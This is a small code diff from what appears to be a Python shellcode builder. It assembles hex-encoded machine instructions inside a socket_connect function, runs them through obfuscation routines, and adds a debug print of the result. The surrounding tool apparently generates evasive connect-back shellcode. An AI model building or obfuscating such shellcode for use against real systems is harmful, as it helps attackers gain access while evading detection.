@@ -234,6 +234,8 @@ def socket_connect(ip, port):
     add_string += "b218" # mov dl,24
     add_string += call()
 
+    print("1 :",add_string)
+
     random1 = factorOffus(add_string)
     of_string = offus(add_string, of_string, random1)
     deof_string = deOffus(random1, add_string)
